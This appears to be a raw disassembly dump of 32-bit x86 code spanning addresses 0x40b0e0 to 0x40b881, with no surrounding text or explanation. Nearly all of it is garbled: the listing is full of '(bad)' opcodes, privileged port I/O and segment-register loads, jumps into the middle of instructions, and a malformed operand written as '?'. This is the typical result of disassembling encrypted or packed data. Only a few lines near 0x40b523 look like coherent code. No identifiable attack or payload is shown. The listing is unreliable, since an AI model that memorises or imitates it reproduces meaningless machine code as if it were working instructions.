  40b0e0:	and    DWORD PTR [eax+0x57],0x310e45e3
  40b0e7:	fiadd  WORD PTR [edx+0x30]
  40b0ea:	or     ch,cl
  40b0ec:	rcr    BYTE PTR [ecx-0x5182e63a],cl
  40b0f2:	add    al,0x7d
  40b0f4:	in     al,dx
  40b0f5:	and    al,cl
  40b0f7:	lock loope 0x40b095
  40b0fa:	sbb    DWORD PTR [edx+0x1a],ebx
  40b0fd:	inc    esp
  40b0fe:	imul   ebp,DWORD PTR ds:0xfaca61fb,0xffffffbc
  40b105:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b106:	mov    ds,WORD PTR [ecx]
  40b108:	ret    
  40b109:	pop    esi
  40b10a:	push   ecx
  40b10b:	(bad)
  40b10e:	leave  
  40b10f:	mov    ds:0x34ab68f1,al
  40b114:	cmp    DWORD PTR [edi+0x63e4d773],0xf5b27116
  40b11e:	mov    edx,0x6127471
  40b123:	ret    0x950f
  40b126:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b127:	ins    BYTE PTR es:[edi],dx
  40b128:	pop    ebx
  40b129:	test   dl,0x64
  40b12c:	pop    es
  40b12d:	jge    0x40b0d0
  40b12f:	mov    eax,ds:0x50567417
  40b134:	cmp    eax,0x4aaf5628
  40b139:	cld    
  40b13a:	and    DWORD PTR [ebx-0x63],edx
  40b13d:	dec    edx
  40b13e:	sbb    al,BYTE PTR [esi]
  40b140:	lock sub BYTE PTR [eax+0x73304fde],ah
  40b147:	cdq    
  40b148:	nop
  40b149:	(bad)  
  40b14a:	push   ebp
  40b14b:	sbb    eax,0x350ad619
  40b150:	mov    dl,0xc2
  40b152:	stos   BYTE PTR es:[edi],al
  40b153:	mov    DWORD PTR [edx],edi
  40b155:	leave  
  40b156:	test   al,0x75
  40b158:	aad    0x71
  40b15a:	dec    edi
  40b15b:	out    0xf2,al
  40b15d:	das    
  40b15e:	adc    al,dh
  40b160:	add    edx,ecx
  40b162:	jmp    0x40b520
  40b167:	shl    BYTE PTR [ebp+0x37],cl
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
  40b170:	retf   0xa792
  40b173:	adc    ch,BYTE PTR [esi-0x55d4351]
  40b179:	jo     0x40b1eb
  40b17b:	lahf   
  40b17c:	jge    0x40b1ee
  40b17e:	jo     0x40b116
  40b180:	sbb    dh,BYTE PTR [ecx-0x7b]
  40b183:	dec    ebx
  40b184:	imul   ebx,DWORD PTR ss:[ebx+edx*4+0x31c9c38d],0xfffffffe
  40b18d:	mov    cs,eax
  40b18f:	mov    dl,0xe3
  40b191:	pop    edx
  40b192:	adc    DWORD PTR [edi],eax
  40b194:	push   edx
  40b195:	jp     0x40b1fe
  40b197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b198:	pop    esi
  40b199:	or     eax,0x15cddd9a
  40b19e:	pop    edx
  40b19f:	pop    esi
  40b1a0:	or     DWORD PTR [ebx+ebp*2+0x6aad6114],esi
  40b1a7:	dec    edx
  40b1a8:	aas    
  40b1a9:	xor    BYTE PTR fs:[edi],al
  40b1ac:	fwait
  40b1ad:	and    BYTE PTR [ebx+ebp*8-0x4ad79c8a],0x88
  40b1b5:	lea    ebp,[ebx+0xfe178b4]
  40b1bb:	not    DWORD PTR [edx]
  40b1bd:	aam    0x81
  40b1bf:	mov    BYTE PTR [ecx-0x6ea6bd0d],cl
  40b1c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1c6:	nop
  40b1c7:	sub    DWORD PTR [ebp-0xd2026c9],ebp
  40b1cd:	inc    esi
  40b1ce:	and    ecx,ecx
  40b1d0:	out    dx,al
  40b1d1:	pop    edx
  40b1d2:	fisubr WORD PTR [esi+ebp*8+0x56d1b843]
  40b1d9:	xchg   esp,eax
  40b1da:	sub    eax,DWORD PTR [edi]
  40b1dc:	sahf   
  40b1dd:	je     0x40b249
  40b1df:	mov    ds:0x4030a16e,eax
  40b1e4:	in     al,dx
  40b1e5:	push   0xe0bb8468
  40b1ea:	pop    ds
  40b1eb:	aad    0x4f
  40b1ed:	inc    ebx
  40b1ee:	mov    al,ds:0x62c531be
  40b1f3:	lods   al,BYTE PTR ds:[esi]
  40b1f5:	cli    
  40b1f6:	imul   esp,esi,0xffffffbd
  40b1f9:	clc    
  40b1fa:	xor    dl,BYTE PTR [edx+0x60]
  40b1fd:	or     eax,0xc290ab6e
  40b202:	add    esp,DWORD PTR [edx+0x52604388]
  40b208:	test   ecx,esi
  40b20a:	xor    edi,ecx
  40b20c:	sub    bl,ah
  40b20e:	clc    
  40b20f:	fmulp  st(2),st
  40b211:	mov    ebx,DWORD PTR [ecx+0x6fa16ad3]
  40b217:	mov    eax,ds:0xc6314197
  40b21c:	sub    BYTE PTR [ebp-0x3f],0xa0
  40b220:	iret   
  40b221:	cmp    edx,DWORD PTR [edx+eax*2+0x711ae6b2]
  40b228:	imul   ecx,DWORD PTR [eax-0x1725272d],0xdf69dc47
  40b232:	ins    BYTE PTR es:[edi],dx
  40b233:	jle    0x40b1ba
  40b235:	xchg   edi,eax
  40b236:	popf   
  40b237:	div    BYTE PTR es:[edx]
  40b23a:	fs inc esp
  40b23c:	ja     0x40b223
  40b23e:	xor    eax,0x3c3b3ba4
  40b243:	xor    BYTE PTR [eax-0x13],dl
  40b246:	imul   ecx,esp,0xa
  40b249:	in     al,dx
  40b24a:	loope  0x40b20f
  40b24c:	or     al,dl
  40b24e:	enter  0xe143,0x75
  40b252:	fld    DWORD PTR [ecx+0x6d]
  40b255:	or     al,0x8d
  40b257:	sbb    eax,0x197e60ef
  40b25c:	jb     0x40b220
  40b25e:	retf   0x2081
  40b261:	mov    ch,0xd2
  40b263:	out    dx,al
  40b264:	dec    eax
  40b265:	jnp    0x40b2b7
  40b267:	pop    eax
  40b268:	imul   edi,DWORD PTR [edx],0xb6690402
  40b26e:	bound  ebp,QWORD PTR [edi+0x54]
  40b271:	inc    ebp
  40b272:	loope  0x40b233
  40b274:	es mov esp,0x771b8f8f
  40b27a:	push   cs
  40b27b:	lahf   
  40b27c:	js     0x40b21e
  40b27e:	xlat   BYTE PTR ds:[ebx]
  40b27f:	cmp    al,0xf8
  40b281:	jmp    DWORD PTR [edx-0x3d1a683d]
  40b287:	gs je  0x40b2e8
  40b28a:	push   esi
  40b28b:	js     0x40b25c
  40b28d:	mov    edx,0x4c3534e4
  40b292:	ja     0x40b25d
  40b294:	cmc    
  40b295:	mov    cl,0x51
  40b297:	(bad)  
  40b298:	sbb    eax,0xc108d28e
  40b29d:	out    dx,al
  40b29e:	(bad)  
  40b29f:	fst    DWORD PTR [ebx+0x4f]
  40b2a2:	pop    ebx
  40b2a3:	and    eax,0xd278c057
  40b2a8:	push   edi
  40b2a9:	mov    ds:0x16f3624f,eax
  40b2ae:	jbe    0x40b2c5
  40b2b0:	jge    0x40b2ae
  40b2b2:	sbb    DWORD PTR [ecx+0x35],ebx
  40b2b5:	adc    eax,0x9ca35ff
  40b2ba:	mov    al,0x83
  40b2bc:	out    0x81,al
  40b2be:	scas   al,BYTE PTR es:[edi]
  40b2bf:	lods   eax,DWORD PTR ds:[esi]
  40b2c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2c1:	js     0x40b2ae
  40b2c3:	xchg   edx,eax
  40b2c4:	or     DWORD PTR [ecx-0x6449f186],edx
  40b2ca:	xchg   edx,eax
  40b2cb:	test   BYTE PTR [edi],ah
  40b2cd:	and    al,0x66
  40b2cf:	xor    DWORD PTR [ebp+0x404f7e6],edx
  40b2d5:	pop    es
  40b2d6:	out    0x3a,al
  40b2d8:	loope  0x40b2ad
  40b2da:	enter  0x19cb,0x77
  40b2de:	push   esp
  40b2df:	imul   edx,DWORD PTR [edx-0x1c],0xf0739416
  40b2e6:	retf   
  40b2e7:	fldenv [edx]
  40b2e9:	jae    0x40b2a4
  40b2eb:	scas   al,BYTE PTR es:[edi]
  40b2ec:	inc    ebx
  40b2ed:	add    eax,0xef568e84
  40b2f2:	cmp    al,0x17
  40b2f4:	in     al,dx
  40b2f5:	shl    BYTE PTR [ecx+0x542eac2e],0x7e
  40b2fc:	inc    ebp
  40b2fd:	dec    ecx
  40b2fe:	aam    0xa9
  40b300:	adc    al,0xce
  40b302:	xchg   esi,eax
  40b303:	sbb    BYTE PTR [ebp-0x1f],bl
  40b306:	jmp    FWORD PTR [ebx+0x79068783]
  40b30c:	add    DWORD PTR [ebx+0x1ee14b1e],esp
  40b312:	nop
  40b313:	jne    0x40b2c7
  40b315:	imul   eax,DWORD PTR [edx-0x674bddce],0x81ab61d
  40b31f:	mov    dl,0x29
  40b321:	cmc    
  40b322:	mov    DWORD PTR [edi+0x50],esp
  40b325:	dec    ecx
  40b326:	adc    ecx,DWORD PTR [ebp+0xbcedcfe]
  40b32c:	and    al,0x1e
  40b32e:	dec    edx
  40b32f:	push   ecx
  40b330:	push   ebp
  40b331:	jge    0xa89ed648
  40b337:	mov    al,ds:0x34b9e2d6
  40b33c:	mov    ecx,DWORD PTR [eax]
  40b33e:	aas    
  40b33f:	xchg   ebp,eax
  40b340:	loop   0x40b2dc
  40b342:	xchg   BYTE PTR [edx+0x74],dh
  40b345:	ret    
  40b346:	imul   edi,edi,0x4ae1f003
  40b34c:	ins    BYTE PTR es:[edi],dx
  40b34d:	xchg   DWORD PTR [eax-0x2e],ecx
  40b350:	mov    eax,DWORD PTR [ebp+eiz*2+0x475b11eb]
  40b357:	div    ch
  40b359:	ret    0x809e
  40b35c:	adc    bl,al
  40b35e:	jg     0x40b3bb
  40b360:	inc    ebp
  40b361:	fs cwde 
  40b363:	mov    cs,WORD PTR [eax-0x5]
  40b366:	in     eax,dx
  40b367:	xor    ch,BYTE PTR [ebx]
  40b369:	retf   0xb86a
  40b36c:	jns    0x40b334
  40b36e:	add    DWORD PTR [esi-0x648ec4c5],ecx
  40b374:	aas    
  40b375:	xchg   ebp,eax
  40b376:	sub    DWORD PTR [eax],edi
  40b378:	test   eax,0x719bca61
  40b37d:	test   DWORD PTR [edx],eax
  40b37f:	sbb    al,0xf1
  40b381:	pop    edx
  40b382:	pop    esp
  40b383:	ret    
  40b384:	adc    al,0xb0
  40b386:	mov    ds:0x543a1dc4,al
  40b38b:	shl    DWORD PTR [edi+esi*2+0x123e1480],cl
  40b392:	ja     0x40b3e9
  40b394:	pop    es
  40b395:	adc    al,0x1b
  40b397:	loop   0x40b3f3
  40b399:	cdq    
  40b39a:	lods   eax,DWORD PTR ds:[esi]
  40b39b:	push   esp
  40b39c:	dec    DWORD PTR [ebx]
  40b39e:	sahf   
  40b39f:	pusha  
  40b3a0:	retf   
  40b3a1:	sbb    dl,cl
  40b3a3:	test   BYTE PTR [edx-0x62026d7e],dl
  40b3a9:	inc    eax
  40b3aa:	pusha  
  40b3ab:	adc    dh,BYTE PTR [esi-0x23]
  40b3ae:	push   esi
  40b3af:	fcmovu st,st(6)
  40b3b1:	mov    ds:0xe5ea721b,eax
  40b3b6:	outs   dx,BYTE PTR ds:[esi]
  40b3b7:	data16 and al,BYTE PTR [esp+eax*8]
  40b3bb:	ror    DWORD PTR [esi+0x7d80a42e],0xd3
  40b3c2:	dec    ecx
  40b3c3:	(bad)  
  40b3c4:	mov    ds:0x87013eec,eax
  40b3c9:	jne    0x40b439
  40b3cb:	xor    eax,0xe06fe79
  40b3d0:	cmp    BYTE PTR [ebx+0x39c2ed0d],cl
  40b3d6:	and    bh,cl
  40b3d8:	fdiv   QWORD PTR [eax]
  40b3da:	aad    0x9e
  40b3dc:	or     bl,ah
  40b3de:	fucomi st,st(0)
  40b3e0:	loope  0x40b3f4
  40b3e2:	push   eax
  40b3e3:	inc    eax
  40b3e4:	xchg   edi,eax
  40b3e5:	int    0xb3
  40b3e7:	jns    0x40b3a6
  40b3e9:	jmp    0x626755aa
  40b3ee:	dec    ecx
  40b3ef:	out    0xa6,al
  40b3f1:	enter  0xa2ed,0x0
  40b3f5:	(bad)  
  40b3f6:	push   ebp
  40b3f7:	lahf   
  40b3f8:	mov    bh,0xa
  40b3fa:	add    bh,ch
  40b3fc:	popf   
  40b3fd:	ss shl bl,cl
  40b400:	jne    0x40b41b
  40b402:	aaa    
  40b403:	or     ebx,DWORD PTR ss:[eax-0x57a9acad]
  40b40a:	fs out 0x6a,eax
  40b40d:	push   ss
  40b40e:	inc    eax
  40b40f:	addr16 push esi
  40b411:	iret   
  40b412:	sbb    al,0xee
  40b414:	iret   
  40b415:	add    ch,BYTE PTR [esi*2+0x1122b69f]
  40b41c:	mov    DWORD PTR [ebp+0x22],esi
  40b41f:	mov    al,ds:0xdfe6753f
  40b424:	leave  
  40b425:	std    
  40b426:	jae    0x40b3af
  40b428:	inc    bl
  40b42a:	sahf   
  40b42b:	in     eax,0xa5
  40b42d:	mov    DWORD PTR [edi-0x36ff3a18],edx
  40b433:	test   BYTE PTR [ebx],ch
  40b435:	mov    ecx,0x4c3517d3
  40b43a:	push   esp
  40b43b:	pop    edi
  40b43c:	adc    ah,al
  40b43e:	aaa    
  40b43f:	leave  
  40b440:	push   esi
  40b441:	sbb    BYTE PTR [esi],cl
  40b443:	push   0x3a
  40b445:	enter  0xb8af,0xcd
  40b449:	aaa    
  40b44a:	jmp    0x762e83ba
  40b44f:	push   eax
  40b450:	mov    bh,0x53
  40b452:	cmp    al,0xea
  40b454:	jbe    0x40b47b
  40b456:	sub    al,0x56
  40b458:	ins    DWORD PTR es:[edi],dx
  40b459:	mov    eax,ds:0xd145898c
  40b45e:	mov    BYTE PTR [ebp-0x8bc9022],al
  40b464:	sti    
  40b465:	lea    esi,[eax]
  40b467:	(bad)
  40b46c:	dec    ecx
  40b46d:	jle    0x40b4a3
  40b46f:	push   ebp
  40b470:	dec    esi
  40b471:	cmp    bh,BYTE PTR ds:0x2819d162
  40b477:	mov    ds:0x58ad34b3,eax
  40b47c:	ins    BYTE PTR es:[edi],dx
  40b47d:	add    al,0x2e
  40b47f:	sub    DWORD PTR [edx+0x2b3f1cd2],ebx
  40b485:	xchg   edi,eax
  40b486:	(bad)  
  40b487:	dec    esp
  40b488:	call   0xb06b:0x565764f9
  40b48f:	hlt    
  40b490:	inc    edi
  40b491:	xchg   edx,eax
  40b492:	mov    ah,0xec
  40b494:	lods   al,BYTE PTR ds:[esi]
  40b495:	push   edx
  40b496:	xor    ebx,DWORD PTR [ebp-0xbe02e1a]
  40b49c:	jne    0x40b47d
  40b49e:	les    ebx,FWORD PTR ds:0x96525da4
  40b4a4:	(bad)  
  40b4a6:	push   ebp
  40b4a7:	push   0x70c5822c
  40b4ac:	adc    BYTE PTR ds:0xa61c7fe6,cl
  40b4b2:	add    al,BYTE PTR [esp+edx*8+0x2d]
  40b4b6:	xchg   edx,eax
  40b4b7:	pop    edx
  40b4b8:	xchg   esp,eax
  40b4b9:	and    eax,DWORD PTR [eax+0x16]
  40b4bc:	stos   DWORD PTR es:[edi],eax
  40b4bd:	(bad)  
  40b4be:	out    0xbc,al
  40b4c0:	fst    QWORD PTR [eax]
  40b4c2:	add    ah,BYTE PTR [eax+0x16]
  40b4c5:	inc    ebp
  40b4c6:	into   
  40b4c7:	lea    ebp,[edi-0x1a6c28d]
  40b4cd:	and    BYTE PTR [ebp-0x3223b792],dl
  40b4d3:	jb     0x40b545
  40b4d5:	fucomp st(3)
  40b4d7:	in     eax,0x6c
  40b4d9:	vpsubw ymm0,ymm5,YMMWORD PTR [eax+ebx*8]
  40b4de:	mov    esi,0x5e510633
  40b4e3:	fisttp QWORD PTR [ecx]
  40b4e5:	xor    ebp,DWORD PTR [ecx]
  40b4e7:	std    
  40b4e8:	cld    
  40b4e9:	pop    ecx
  40b4ea:	jno    0x40b525
  40b4ec:	pop    ecx
  40b4ed:	jp     0x40b4fe
  40b4ef:	mov    WORD PTR [ebx-0x2d],gs
  40b4f2:	adc    BYTE PTR [edx-0x15189581],dh
  40b4f8:	popf   
  40b4f9:	push   0xdc7ac15d
  40b4fe:	inc    esp
  40b4ff:	test   DWORD PTR [eax],ebp
  40b501:	in     eax,0xaa
  40b503:	or     ah,BYTE PTR [ebx+0x1d]
  40b506:	adc    dh,ch
  40b508:	inc    esi
  40b509:	push   ds
  40b50a:	adc    cl,0x7d
  40b50d:	adc    DWORD PTR [ecx+0x9adac94],ebp
  40b513:	inc    edx
  40b514:	push   esi
  40b515:	rcl    BYTE PTR [edx],0x2f
  40b518:	inc    BYTE PTR [ebp+ecx*8-0x5685f99f]
  40b51f:	sub    BYTE PTR [edi],cl
  40b521:	scas   eax,DWORD PTR es:[edi]
  40b522:	xlat   BYTE PTR ds:[ebx]
  40b523:	mov    edi,DWORD PTR [ebp-0x8]
  40b526:	mov    ebx,DWORD PTR [ebp-0x10]
  40b529:	sub    ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	cmp    al,0x3f
  40b551:	pushf  
  40b552:	rol    ecx,0x86
  40b555:	jo     0x40b5c7
  40b557:	lahf   
  40b558:	jge    0x40b5ca
  40b55a:	jo     0x40b596
  40b55c:	sbb    edx,DWORD PTR [ebx-0x71a02881]
  40b562:	scas   eax,DWORD PTR es:[edi]
  40b563:	mov    ch,0x4d
  40b565:	pop    edx
  40b566:	mov    eax,ds
  40b568:	hlt    
  40b569:	call   0x8a51c4fb
  40b56e:	add    BYTE PTR [eax+0x38bf3d0],al
  40b574:	dec    edx
  40b575:	mov    al,ds:0x9702b51f
  40b57a:	dec    eax
  40b57b:	xchg   ebp,eax
  40b57c:	add    al,0x81
  40b57e:	pop    ss
  40b57f:	push   es
  40b580:	cdq    
  40b581:	test   al,0x9e
  40b583:	and    ebx,DWORD PTR [esi+0x27]
  40b586:	pop    ss
  40b587:	into   
  40b588:	mov    eax,0xc8692641
  40b58d:	dec    edx
  40b58e:	leave  
  40b58f:	jmp    0x40b574
  40b591:	jbe    0x40b606
  40b593:	jnp    0x40b5ef
  40b595:	jecxz  0x40b5a6
  40b597:	xor    eax,0x66d3da2d
  40b59c:	lods   al,BYTE PTR ds:[esi]
  40b59d:	mov    ds:0x347049c3,eax
  40b5a2:	adc    al,0xc8
  40b5a4:	enter  0xc6ee,0x96
  40b5a8:	pop    ecx
  40b5a9:	push   0x4e58e2a6
  40b5ae:	jne    0x40b61a
  40b5b0:	shr    BYTE PTR [eax],0x58
  40b5b3:	jo     0x40b574
  40b5b5:	xlat   BYTE PTR ds:[ebx]
  40b5b7:	in     al,0x20
  40b5b9:	mov    ebp,0x2ad01690
  40b5be:	fidivr WORD PTR [ebx+0x75]
  40b5c1:	and    BYTE PTR [esi+0x2c5ef09],ah
  40b5c7:	mov    ebx,0x7778f059
  40b5cc:	xchg   ebx,eax
  40b5cd:	mov    bh,BYTE PTR [edx+0x5b9f70ea]
  40b5d3:	mov    ch,0x33
  40b5d5:	in     al,dx
  40b5d6:	jns    0x40b571
  40b5d8:	out    dx,al
  40b5d9:	jbe    0x40b5ca
  40b5db:	and    BYTE PTR [edx],al
  40b5dd:	add    BYTE PTR [esi-0x68c3b811],al
  40b5e3:	dec    esi
  40b5e4:	jecxz  0x40b59a
  40b5e6:	imul   ebp,DWORD PTR [esi],0xa79c0e04
  40b5ec:	push   eax
  40b5ed:	rcl    DWORD PTR [ebp-0x15b64319],cl
  40b5f3:	in     al,dx
  40b5f4:	xchg   edi,eax
  40b5f5:	mov    esi,0x55edda6d
  40b5fa:	or     esp,esi
  40b5fc:	and    al,dl
  40b5fe:	lods   al,BYTE PTR ds:[esi]
  40b5ff:	sub    eax,0x992ba04
  40b604:	xor    BYTE PTR [eax-0x122874ad],0x1c
  40b60b:	icebp  
  40b60c:	dec    ecx
  40b60d:	xchg   esp,eax
  40b60e:	push   es
  40b60f:	add    al,0xdb
  40b611:	test   al,0x13
  40b613:	pop    ds
  40b614:	mov    al,ds:0xd5be13c2
  40b619:	cmp    bh,BYTE PTR [eax-0x4c]
  40b61c:	xor    al,BYTE PTR [edx]
  40b61e:	jmp    0x40b67d
  40b620:	shl    DWORD PTR [eax+0x6],1
  40b623:	jnp    0x40b67d
  40b625:	push   cs
  40b626:	cld    
  40b627:	or     dl,dl
  40b629:	jmp    0x40b697
  40b62b:	je     0xc473984
  40b631:	popa   
  40b632:	inc    esp
  40b633:	mov    edi,0x536e5fdc
  40b638:	sbb    ebx,edx
  40b63a:	push   edi
  40b63b:	nop
  40b63c:	das    
  40b63d:	sbb    al,0xf8
  40b63f:	arpl   WORD PTR [ecx-0x136e01c5],si
  40b645:	idiv   BYTE PTR [eax]
  40b647:	sub    eax,0x3a92c5bb
  40b64c:	sub    al,0x2c
  40b64e:	adc    BYTE PTR [esi-0x3c],dl
  40b651:	aas    
  40b652:	loope  0x40b664
  40b654:	push   0xaeef16b9
  40b659:	data16 mov al,0xb6
  40b65c:	push   eax
  40b65d:	imul   eax,eax,0x4f2e16df
  40b663:	pop    edx
  40b664:	nop
  40b665:	retf   
  40b666:	jmp    0xf14c:0x1228589a
  40b66d:	stc    
  40b66e:	in     al,dx
  40b66f:	enter  0x3a8d,0x8e
  40b673:	bound  esp,QWORD PTR [edx]
  40b675:	sti    
  40b676:	pop    ebx
  40b677:	out    dx,eax
  40b678:	cmp    BYTE PTR [ecx+0x5c],ch
  40b67b:	mov    ecx,0x6031995
  40b680:	jmp    0x40b6a2
  40b682:	mov    dl,0x8c
  40b684:	or     al,0x17
  40b686:	pop    ebx
  40b687:	push   0xffffffcd
  40b689:	or     eax,0xc794793d
  40b68e:	test   cl,dl
  40b690:	les    ecx,FWORD PTR [edi+0x3a]
  40b693:	std    
  40b694:	or     ebx,DWORD PTR [ecx-0x6f]
  40b697:	dec    esp
  40b698:	jl     0x40b69b
  40b69a:	and    BYTE PTR [edx],ch
  40b69c:	sti    
  40b69d:	mov    bh,0xd4
  40b69f:	sbb    BYTE PTR [ecx],0xac
  40b6a2:	inc    esi
  40b6a3:	into   
  40b6a4:	retf   0x4d76
  40b6a7:	lods   eax,DWORD PTR ds:[esi]
  40b6a8:	and    dl,BYTE PTR [esi+edx*1]
  40b6ab:	and    DWORD PTR [ecx-0x4],0x2b
  40b6af:	test   ebx,edx
  40b6b1:	loope  0x40b65d
  40b6b3:	stc    
  40b6b4:	lock mov esi,0x5b454acc
  40b6ba:	(bad)  
  40b6bb:	(bad)  
  40b6bc:	and    al,BYTE PTR [ecx-0x3fb1c4ca]
  40b6c2:	mov    ebx,0xaf22eebe
  40b6c7:	cdq    
  40b6c8:	cmp    ebx,ecx
  40b6ca:	arpl   si,si
  40b6cc:	ficom  DWORD PTR [edx]
  40b6ce:	mov    ebx,0x86b4c26d
  40b6d3:	sub    BYTE PTR [ebx-0x2b8fed7b],0x92
  40b6da:	pop    esp
  40b6db:	lahf   
  40b6dc:	imul   esi,ecx,0xa8ea9d4c
  40b6e2:	js     0x40b72a
  40b6e4:	aam    0xd
  40b6e6:	sahf   
  40b6e7:	inc    esi
  40b6e8:	mov    ah,0x56
  40b6ea:	int    0x87
  40b6ec:	out    0x5c,eax
  40b6ee:	mov    edx,0xfc7441cf
  40b6f3:	loope  0x40b76f
  40b6f5:	jne    0x40b6f2
  40b6f7:	push   0xffffff84
  40b6f9:	popf   
  40b6fa:	icebp  
  40b6fb:	mov    ebp,0x8bdc81ee
  40b700:	(bad)  
  40b701:	clc    
  40b702:	mov    edx,DWORD PTR [edx]
  40b704:	inc    eax
  40b705:	or     al,0x5e
  40b707:	pop    esp
  40b708:	sar    DWORD PTR [edx],0x8b
  40b70b:	loope  0x40b771
  40b70d:	fnstenv [esi+0x1a]
  40b710:	jb     0x40b6c4
  40b712:	mov    bh,0x7e
  40b714:	enter  0xd89d,0x52
  40b718:	push   esp
  40b719:	lods   al,BYTE PTR ds:[esi]
  40b71a:	mov    ebx,0x2db64a2d
  40b71f:	or     ah,bl
  40b721:	add    BYTE PTR [ebx+0x7e7c03f5],0x43
  40b728:	std    
  40b729:	sbb    ah,BYTE PTR [edx+0x3b29fa73]
  40b72f:	xor    DWORD PTR [edx+esi*2+0x68],ecx
  40b733:	hlt    
  40b734:	sub    bh,al
  40b736:	inc    edi
  40b737:	mov    DWORD PTR [ebx-0x25],ebp
  40b73a:	out    dx,al
  40b73b:	je     0x40b799
  40b73d:	fcom   DWORD PTR [ecx+0x3c09a7a1]
  40b743:	loope  0x40b77c
  40b745:	in     eax,dx
  40b746:	mov    ebx,DWORD PTR ds:0x4ea4a6e6
  40b74c:	push   0xffffffa4
  40b74e:	(bad)  [edi-0x745c987b]
  40b754:	outs   dx,DWORD PTR ds:[esi]
  40b755:	jb     0x40b7c2
  40b757:	stc    
  40b758:	jp     0x40b7d3
  40b75a:	inc    ebx
  40b75b:	hlt    
  40b75c:	sub    eax,DWORD PTR [edi-0x69]
  40b75f:	cdq    
  40b760:	(bad)  
  40b761:	aas    
  40b762:	lds    ebp,FWORD PTR [edi-0x772e61a1]
  40b768:	lods   al,BYTE PTR ds:[esi]
  40b769:	shl    DWORD PTR [ebp+0x12765541],cl
  40b76f:	dec    eax
  40b770:	enter  0x97bd,0x41
  40b774:	add    DWORD PTR [esi],edi
  40b776:	pop    ebx
  40b777:	lds    esp,FWORD PTR [edx-0x33]
  40b77a:	aad    0x2d
  40b77c:	popf   
  40b77d:	and    dh,BYTE PTR [ecx]
  40b77f:	mov    edi,0x17a1285f
  40b784:	jbe    0x40b7c4
  40b786:	jmp    0x14c13816
  40b78b:	pop    edi
  40b78d:	lds    edi,FWORD PTR [edx+0x4e]
  40b790:	mov    edx,0xe6e76f38
  40b795:	mov    dl,0xf0
  40b797:	(bad)  
  40b798:	xchg   ebx,eax
  40b799:	jp     0x40b738
  40b79b:	xor    eax,0x555e9f5e
  40b7a0:	dec    eax
  40b7a1:	mov    bl,0xeb
  40b7a3:	jl     0x40b75e
  40b7a5:	xchg   ecx,eax
  40b7a6:	into   
  40b7a7:	repnz pop es
  40b7a9:	mov    ebp,0x536faafb
  40b7ae:	sub    eax,0xb017d885
  40b7b3:	popa   
  40b7b4:	mov    al,0xc
  40b7b6:	mov    esi,0x1928c73c
  40b7bb:	mov    bh,0x16
  40b7bd:	mov    eax,0xbc55d2cf
  40b7c2:	add    edx,DWORD PTR [ecx]
  40b7c4:	test   ah,al
  40b7c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7c7:	inc    ebp
  40b7c8:	test   al,0x65
  40b7ca:	push   esp
  40b7cb:	cld    
  40b7cc:	xchg   edi,eax
  40b7cd:	aas    
  40b7ce:	ins    DWORD PTR es:[edi],dx
  40b7cf:	mov    bl,0x15
  40b7d1:	in     al,0x47
  40b7d3:	cmp    ah,BYTE PTR [ebp-0x4b]
  40b7d6:	sbb    al,0xd3
  40b7d8:	inc    eax
  40b7d9:	mov    ah,0x39
  40b7db:	jae    0x40b84c
  40b7dd:	mov    WORD PTR [ecx+0x339e2d71],?
  40b7e3:	ror    BYTE PTR [ebx],0x32
  40b7e6:	ins    DWORD PTR es:[edi],dx
  40b7e7:	sub    al,0x41
  40b7e9:	pop    ebp
  40b7ea:	ret    
  40b7eb:	dec    ebp
  40b7ec:	xlat   BYTE PTR ds:[ebx]
  40b7ed:	dec    ebx
  40b7ee:	pop    DWORD PTR [ebp-0x5f]
  40b7f1:	jno    0x40b7f1
  40b7f3:	xchg   ebx,eax
  40b7f4:	or     dh,BYTE PTR [eax-0x3a]
  40b7f7:	add    esp,esi
  40b7f9:	rcl    DWORD PTR [edi],0x5a
  40b7fc:	les    ebp,FWORD PTR [ebx+0x7d8f4a7e]
  40b802:	and    eax,0x4585c0be
  40b807:	call   0x52af:0x7511e51c
  40b80e:	xchg   BYTE PTR [eax+0xd81fbc],dh
  40b814:	inc    DWORD PTR [ebx+0x19]
  40b817:	call   FWORD PTR [esi+0x3b161137]
  40b81d:	test   DWORD PTR [eax-0x29],ebx
  40b820:	xor    eax,0x26bb1abf
  40b825:	cld    
  40b826:	enter  0x8db4,0x48
  40b82a:	dec    ecx
  40b82b:	jbe    0x40b804
  40b82d:	inc    edi
  40b82e:	xchg   ebp,eax
  40b82f:	or     al,0x5
  40b831:	call   0x43520be4
  40b836:	mov    edi,0x6814c200
  40b83b:	int    0x21
  40b83d:	mov    al,0x15
  40b83f:	stc    
  40b840:	cmp    bl,cl
  40b842:	(bad)  
  40b844:	jp     0x40b7e5
  40b846:	or     eax,DWORD PTR [edx-0xe]
  40b849:	retf   
  40b84a:	inc    ebp
  40b84b:	mov    ebx,DWORD PTR [ecx+0x1c24c371]
  40b851:	test   eax,0x9963053f
  40b856:	scas   eax,DWORD PTR es:[edi]
  40b857:	data16 in al,dx
  40b859:	jge    0x40b8c3
  40b85b:	faddp  st(2),st
  40b85d:	push   ecx
  40b85e:	mov    cl,0x38
  40b860:	ret    0xf616
  40b863:	mov    ah,0x6e
  40b865:	or     al,0xbe
  40b867:	and    dh,ah
  40b869:	xchg   BYTE PTR [eax-0x69],al
  40b86c:	test   BYTE PTR [edx+0x63],ch
  40b86f:	cmc    
  40b870:	(bad)  
  40b871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b872:	jecxz  0x40b884
  40b874:	xor    ah,ch
  40b876:	mov    eax,ds:0x87ac9ed2
  40b87b:	out    dx,eax
  40b87c:	stos   BYTE PTR es:[edi],al
  40b87d:	pop    ecx
  40b87e:	mov    cl,0x88
  40b880:	stos   BYTE PTR es:[edi],al
  40b881:	pop    esp
